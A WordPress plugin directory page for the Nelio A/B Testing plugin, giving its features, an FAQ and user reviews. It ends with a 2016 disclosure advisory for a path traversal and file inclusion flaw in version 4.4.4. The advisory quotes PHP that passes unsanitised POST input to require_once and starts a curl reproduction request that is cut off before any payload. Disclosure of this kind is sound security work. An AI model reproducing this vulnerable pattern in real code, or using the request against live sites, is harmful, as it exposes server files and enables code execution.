With Nelio you can test not only pages but any kind of content including menus, themes, your Woocommerce products, CSS rules, JavaScript, and much more.

[MORE INFORMATION](https://neliosoftware.com/testing/?utm_source=wordpressorg&utm_medium=referral&utm_campaign=nelio-ab-testing) | [DOCUMENTATION](https://neliosoftware.com/testing/help/?utm_source=wordpressorg&utm_medium=referral&utm_campaign=nelio-ab-testing) | [SUPPORT FORUM](https://wordpress.org/support/plugin/nelio-ab-testing/)

**A/B Testing for everyone.** Just activate the plugin in your WordPress and discover what Nelio can offer you. The free version makes it extremely easy to run unlimited Heatmaps and A/B tests on low-traffic sites. And if you ever need more, you can purchase a premium plan and get an account to keep improving your WordPress!

#### 10+ Reasons for Choosing Nelio

#### #1 ‚Äì ‚ù§Ô∏è Fully integrated within your WordPress

There‚Äôs no [need to learn an external tool](https://neliosoftware.com/blog/5-reasons-use-nelio-ab-testing-wordpress/?utm_source=wordpressorg&utm_medium=referral&utm_campaign=nelio-ab-testing). Nelio A/B Testing has been designed to be simple and fast to use without ever leaving WordPress to create, edit or see the progress of your tests.

Our plugin lifts all the processing load from your own server and takes it back to our cloud. This way, A/B tests do not slow down your site or interfere with your hosting provider limits.

#### #2 ‚Äì üôå Test everything!

You can create all kinds of tests not only for pages but for all the elements of your WordPress:

* **All your content.** Improve your landing pages, write better posts, create alternative pages and custom post types, and start testing headlines.
* **WooCommerce Products.** Test the content of your WooCommerce store. Find out how to improve your products and offers to get more sales.
* **Global tests beyond content.** Try new themes, test different menus, templates or alternative widgets, modify your CSS rules, or create custom JavaScript snippets to change the appearance and behavior of your pages.
* **Heatmaps, Scrollmaps, and Confetti.** Find out what your visitors are doing from different devices as they browse your website. They are a perfect companion of A/B tests, for they give insights on what to test next and help you understand the progress of your tests.

#### #3 ‚Äì üñåÔ∏è Compatible with Gutenberg and The Best Page Builders

Nelio A/B Testing not only works perfectly fine with the block editor but you can also create alternative content for your tests with your favorite page builder like Elementor, OptimizePress, SiteOrigin, Beaver Builder, Leadpages, Divi Builder, OptimizePress or Visual Composer.

#### #4 ‚Äì ü§ë Conversions are the key to success

Nelio A/B Testing allows you to evaluate one or more [conversion goals](https://neliosoftware.com/testing/analytics/?utm_source=wordpressorg&utm_medium=referral&utm_campaign=nelio-ab-testing) and, for each of them, [track the important actions your visitors take](https://neliosoftware.com/testing/analytics/?utm_source=wordpressorg&utm_medium=referral&utm_campaign=nelio-ab-testing): visiting a page, clicking on an element, visiting an external link, submitting a form (compatible with Contact Form 7, Gravity Forms, Nelio Forms, Ninja Forms, WPForms , Formidable Forms, HubSpot Forms, Elementor forms, and more), watch YouTube videos, adding or purchasing WooCommerce products, or after you‚Äôve programmatically triggered your own custom JavaScript event.

#### #5 ‚Äì üìê Run tests targeted for specific set of visitors

If you‚Äôre interested in testing a subset of your visitors, you can do so using [Nelio A/B Testing‚Äôs segmentation capabilities](https://neliosoftware.com/testing/help/how-to-use-segmentation-in-nelio-ab-testing/?utm_source=wordpressorg&utm_medium=referral&utm_campaign=nelio-ab-testing). Refine the audience you want to understand by defining the characteristics that are relevant for a specific test: country, language, device, referrer, date, time, and more!

#### #6 ‚Äì üìà Easy-to-understand results

Visitors and test results are displayed immediately. All details are very intuitive and provide you with the information you need to know which alternative is working best for you:

* Day-to-day information that will help you understand what happens over time.
* See at a glance how confident you can be of having found a winning variant.
* Compare each variant with the original version.

#### #7 ‚Äì 1Ô∏è‚É£One-click winner

Apply the winning version quickly and increase your income right away! Once you know which version is the best, make it your default page as soon as possible. You can do it with a simple click!

#### #8 ‚Äì üõ†Ô∏è Cache Support and Server Load

One of our priorities is efficiency. The process of A/B testing a site is not necessarily at odds with performance. Nelio A/B Testing implements several mechanisms to reduce the impact of testing your site, such as [support for cache systems in WordPress](https://neliosoftware.com/testing/help/is-nelio-ab-testing-compatible-with-cache-plugins/?utm_source=wordpressorg&utm_medium=referral&utm_campaign=nelio-ab-testing).

#### #9 ‚Äì ü™™ Commitment to Data Privacy and Protection

From its very first day, Nelio A/B Testing was designed with the privacy of the end user in mind. From the perspective of your visitors and users, Nelio A/B Testing does not store any user-identifying information and can be integrated with your cookie consent banner and, thus, be fully compliant with the GDPR.

## FAQ

### Why should I use an A/B Testing Solution specifically designed for WordPress?

* **Smooth learning curve.** There is no need to learn yet another tool.

  Everything (from the creation of tests to the visualization of the results) is done from the WordPress dashboard you are familiar with, resulting in a well-known, perfectly integrated user interface.
* **Evolve your WordPress site easily.** A native WordPress solution automates and simplifies the evolution of your site. Consider, for example, applying the winner alternative in your site as soon as the results are statistically significant. With a native solution, this is as easy as clicking one single button. With a generic tool, on the other hand, you would have to manually modify the page so that it integrates the changes you created in the (winning) alternative.
* **Fine-grained testing.** The ‚Äútesting unit‚Äù in a generic tool is the web page, since the HTML of the page is the only thing those tools have access to. A native WordPress solution, however, permits you to test any WordPress specific component, such as posts, pages, CSS, themes, child themes, and many more coming!

My company was using this to A/B test our home page. We utilize certain acf-powered fields, which weren‚Äôt supported by Nelio out-of-the-box.
Nelio worked with us to make sure our needs were met, with timely responses and updates. They got everything working as required, and tests went very smoothly. Definitely would recommend this plugin to others and will use it for future A/B needs.

It is functional, easy to use and setup and an all around great experience to work with. The support team is quick to respond and incredibly knowledgeable and helpful for when you need them! There is nothing I can throw at them that they can‚Äôt handle.
If you are wanting the best in class A/B Testing software, look no further. Nelio is the clear winner.

I‚Äôve been using Nelio‚Äôs A/B testing tool for the past few months, and the results have been nothing short of impressive! From day one, the platform was easy to implement and seamlessly integrated into my workflow, allowing me to test critical aspects of my website without any hassle.
Thanks to Nelio, I‚Äôve seen a significant increase in revenue, conversion rates, and average order value (AOV). The detailed insights it provides helped me understand what resonates best with my audience and make data-driven decisions that have had a direct impact on my bottom line.
What really sets Nelio apart is its user-friendly interface and actionable analytics. Even complex tests ‚Äì such as split URL and multivariate testing ‚Äì are straightforward to set up, and I always feel confident in the reliability of the results.
If you‚Äôre serious about optimizing your website and driving meaningful results, I highly recommend Nelio. It‚Äôs been a game-changer for me, and I‚Äôm excited to continue refining my site using this powerful tool!

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

Product: WordPress plugin nelio-ab-testing (Nelio AB Testing)
Product URL:
    <https://wordpress.org/plugins/nelio-ab-testing/>
    <https://nelioabtesting.com/>
Vendor: Nelio Software
    <http://neliosoftware.com/>
    <https://profiles.wordpress.org/nelio/>

Vulnerability type: Improper Limitation of a Pathname to a Restricted Directory
CWE: <https://cwe.mitre.org/data/definitions/22.html>
OVE: OVE-20160509-0045
Vulnerable versions: 4.4.4
Fixed version: 4.5.0
Vendor notification: 2016-03-27
Solution date: 2016-04-08
Public disclosure: 2016-05-10

Description of the plugin (from WordPress Plugin Directory):

A/B Testing, conversion rate optimization, and beautiful Heatmaps specifically
designed for WordPress.

Vulnerability details:

The software uses external input to construct a pathname that is intended to
identify a file that is located underneath a restricted parent directory, but
the software does not properly neutralize special elements within the pathname
that causes the pathname to resolve to a location that is outside of the
intended directory.

Risk:

The attacker is able to read the contents of files and expose sensitive data. If
the targeted file is used for a security mechanism, then the attacker is able to
bypass that mechanism.

Affected code:

./nelio-ab-testing/includes/admin/admin-controller.php
527                 public function generate_html_content() {
528                         if ( isset( $_POST['filename'] ) && isset( $_POST['classname'] ) ) {
529                                 $file  = $_POST['filename'];
530                                 $class = $_POST['classname'];
531                                 require_once( $file );
532                                 call_user_func( array ( $class, 'generate_html_content' ) );
533                         }
534                 }

Notes:

Authentication required.

Steps to reproduce:

curl -i -s -k  -X 'POST' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; \
rv:38.0) Gecko/20100101 Firefox/38.0 Iceweasel/38.7.1' -H 'Content-Type: \
